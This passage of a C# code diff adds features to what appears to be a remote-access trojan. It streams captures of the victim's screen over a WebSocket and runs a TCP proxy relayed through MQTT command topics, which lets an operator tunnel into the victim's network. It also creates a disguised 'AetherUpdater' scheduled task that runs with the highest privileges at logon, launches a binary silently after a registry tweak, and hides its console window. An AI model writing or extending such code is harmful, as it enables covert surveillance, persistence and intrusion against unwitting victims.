+                            g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
+                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                            
+                            IntPtr hdcDest = g.GetHdc();
+                            IntPtr hdcSrc = GetDC(IntPtr.Zero);
+                            StretchBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, screenWidth, screenHeight, 0x00CC0020 | 0x40000000);
+                            ReleaseDC(IntPtr.Zero, hdcSrc);
+                            g.ReleaseHdc(hdcDest);
+                        }
+                        
+                        using (var ms = new MemoryStream()) {
+                            bmp.Save(ms, jpegCodec, encoderParams);
+                            byte[] imgBytes = ms.ToArray();
+                            
+                            // Send via WebSocket: [TYPE(1)][TARGET_ID(36)][FRAME_ID(4)][DATA]
+                            byte[] packet = new byte[1 + 36 + 4 + imgBytes.Length];
+                            packet[0] = 0x02; // DATA type
+                            Encoding.UTF8.GetBytes(machineId.PadRight(36)).CopyTo(packet, 1);
+                            BitConverter.GetBytes(frameId).CopyTo(packet, 37);
+                            imgBytes.CopyTo(packet, 41);
+                            
+                            await _vncWebSocket.SendAsync(
+                                new ArraySegment<byte>(packet),
+                                WebSocketMessageType.Binary,
+                                true,
+                                CancellationToken.None
+                            );
+                            
+                            frameId++;
+                        }
+                    }
+                    
+                    // Target 20 FPS
+                    int elapsed = (int)stopwatch.ElapsedMilliseconds;
+                    int delay = Math.Max(0, 50 - elapsed);
+                    if (delay > 0) await Task.Delay(delay);
+                    stopwatch.Restart();
+                    
+                } catch { break; }
+            }
+        } catch { } finally {
+            _vncActive = false;
+            _vncWebSocket?.Dispose();
+        }
+    }
+
     [DllImport("ntdll.dll")]
     private static extern uint NtOpenFile(out IntPtr handle, uint desiredAccess, ref OBJECT_ATTRIBUTES objAttr, out IO_STATUS_BLOCK ioStatus, uint shareAccess, uint openOptions);
 
@@ -497,8 +914,64 @@ class Program
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string? lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    private static ConcurrentDictionary<string, TcpClient> proxyClients = new ConcurrentDictionary<string, TcpClient>();
+
+    private static void StartProxy(IMqttClient mqttClient) {
+        // Proxy Engine initialized.
+    }
+
+    private static async Task HandleProxyData(string p, IMqttClient mqttClient) {
+        try {
+            string[] s = p.Split(new[] { '|' }, 4);
+            if (s.Length < 4) return;
+            string connId = s[0];
+            string type = s[1];
+            string targetHost = s[2];
+            int targetPort = int.Parse(s[3]);
+
+            if (type == "CONNECT") {
+                TcpClient client = new TcpClient();
+                await client.ConnectAsync(targetHost, targetPort);
+                proxyClients[connId] = client;
+                _ = Task.Run(() => ProxyListen(connId, client, mqttClient));
+            }
+            else if (type == "DATA") {
+                if (proxyClients.TryGetValue(connId, out var client)) {
+                    byte[] data = Convert.FromBase64String(targetHost); // Host field reused for data in v9.0
+                    await client.GetStream().WriteAsync(data, 0, data.Length);
+                }
+            }
+            else if (type == "CLOSE") {
+                if (proxyClients.TryRemove(connId, out var client)) client.Close();
+            }
+        } catch { }
+    }
+
+    private static async void ProxyListen(string connId, TcpClient client, IMqttClient mqttClient) {
+        byte[] buffer = new byte[30000];
+        try {
+            var stream = client.GetStream();
+            while (client.Connected) {
+                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
+                if (read <= 0) break;
+                string b64 = Convert.ToBase64String(buffer, 0, read);
+                var msg = new MqttApplicationMessageBuilder()
+                    .WithTopic($"{secretId}/{machineId}/proxy/res")
+                    .WithPayload($"{connId}|DATA|{b64}")
+                    .Build();
+                await mqttClient.PublishAsync(msg);
+            }
+        } catch { } finally {
+            proxyClients.TryRemove(connId, out _);
+            var msgClose = new MqttApplicationMessageBuilder()
+                .WithTopic($"{secretId}/{machineId}/proxy/res")
+                .WithPayload($"{connId}|CLOSE|")
+                .Build();
+            await mqttClient.PublishAsync(msgClose);
+        }
+    }
+
+
 
     [StructLayout(LayoutKind.Sequential)]
     struct STARTUPINFO {
@@ -630,8 +1103,8 @@ class Program
             // Fallback to schtasks if token stealing fails
             string taskName = "AetherUpdater_" + Guid.NewGuid().ToString().Substring(0, 8);
             string exe = Process.GetCurrentProcess().MainModule.FileName;
-            ExecuteCommand($"schtasks /create /tn \"{taskName}\" /tr \"{exe}\" /sc onlogon /rl highest /f");
-            ExecuteCommand($"schtasks /run /tn \"{taskName}\"");
+            Process.Start(new ProcessStartInfo("schtasks", $"/create /tn \"{taskName}\" /tr \"'{exe}' --task\" /sc onlogon /rl highest /f") { CreateNoWindow = true, UseShellExecute = false }).WaitForExit();
+            Process.Start(new ProcessStartInfo("schtasks", $"/run /tn \"{taskName}\"") { CreateNoWindow = true, UseShellExecute = false });
             return;
         }
         
@@ -673,8 +1146,8 @@ class Program
                 key.SetValue(delegateVal, "");
             }
 
-            // 2. Execution
-            Process.Start(new ProcessStartInfo(binary) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
+            // 2. Execution (Silent)
+            Process.Start(new ProcessStartInfo(binary) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
 
             System.Threading.Thread.Sleep(1000); // Wait only 1 second to trigger
 
@@ -685,4 +1158,25 @@ class Program
             noiseTask.Wait(500);
         } catch { }
     }
+    private static void HideConsole() {
+        try {
+            IntPtr hWnd = GetConsoleWindow();
+            if (hWnd != IntPtr.Zero) ShowWindow(hWnd, 0); // 0 = SW_HIDE
+        } catch { }
+    }
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("user32.dll")]
+    public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
+    [DllImport("gdi32.dll")]
+    public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetDC(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
 }
